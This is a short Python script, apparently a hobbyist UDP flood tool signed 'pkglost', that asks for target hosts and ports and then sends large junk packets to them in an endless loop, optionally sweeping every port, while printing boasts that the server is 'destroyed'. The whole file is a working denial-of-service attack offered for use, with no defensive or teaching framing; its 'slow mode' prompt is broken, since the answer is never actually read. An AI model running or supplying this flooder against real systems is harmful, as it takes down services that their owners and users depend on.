import os
import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system("clear")
print("""\033[33m
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠄⠄⠄⠄⠄⠈⠉⠉⢛⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠁⠄⣠⣴⠿⠛⢻⡷⠶⢤⣤⣄⣸⣧⡍⢙⠻⣿
⣿⣿⣿⣿⠋⠄⢠⣾⠟⠛⠓⣶⢿⣤⣄⣸⣇⠉⢻⣿⠁⣿⠄⣿
⣿⣿⣿⠏⠄⣼⣿⡁⠄⠄⣰⠏⠄⠄⠉⢹⡿⠛⠿⢿⣇⣙⣠⣿
⣿⣿⡇⢀⣼⣿⠋⠛⠻⢶⡿⣤⣤⣀⡀⢸⡇⠄⠄⢸⣿⣿⣿⣿
⣿⣿⠄⣸⣿⣇⠄⠄⠄⣾⠄⠄⠈⠉⠛⣻⠳⠶⣦⣤⣿⣿⣿⣿
⣿⣿⣷⣿⣿⡏⠙⠛⢿⣿⣤⣄⣀⣀⢠⡿⠄⠄⠄⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⠄⠄⣿⠃⠄⠄⠉⠙⣿⠷⠶⢤⣤⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡛⠲⣿⣦⣤⣀⡀⣼⠇⠄⠄⢠⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣷⣀⣿⡀⠈⢉⣽⠛⠻⢶⣶⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣥⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿
╭━━━┳━━━┳━━━┳━━━╮
╰╮╭╮┣╮╭╮┃╭━╮┃╭━╮┃
╱┃┃┃┃┃┃┃┃┃╱┃┃╰━━╮
╱┃┃┃┃┃┃┃┃┃╱┃┣━━╮┃
╭╯╰╯┣╯╰╯┃╰━╯┃╰━╯┃
╰━━━┻━━━┻━━━┻━━━╯
Made by pkglost
""")
print("")

bytes = "qwerty"*2000
sent = 0
max = 1000

ips = input("\033[36mIP/Host which site you want to attack? (127.0.0.1; 127.0.0.1,192.168.1.1): ")
ips = (ips+",").split(",")
ips.pop()

ports = input("\033[36mhow many ports to use? (80; 80,8080,443; all): ")
if ports != "all":
     ports = (ports+",").split(",")
     ports.pop()

mode = ("\033[36menable slow mode? (y; n): ")

os.system("clear")
print("Запуск...")
time.sleep(0.5)


def attack(ip, port):
	global sent
	global max
	
	sock.sendto(str.encode(bytes), (ip,int(port)))
	sent += 1
	print("\033[36m%s packages killed the server (stopped Ctrl+z) - %s:%s"%(sent,ip,port))

	if mode == "y":
		if sent == max:
			max += 1000
			time.sleep(0.5)


port_for_fast = 1
while True:
	for ip in ips:
		try:
			if ports != "all":
				for port in ports:
					attack(ip, port)
			else:
				attack(ip, port_for_fast)
				
				port_for_fast += 1
				if port_for_fast == 65536:
					port_for_fast = 1
		except:
			print("\033[36mServer (stopped Ctrl+z) "+ip+" destroyed!")
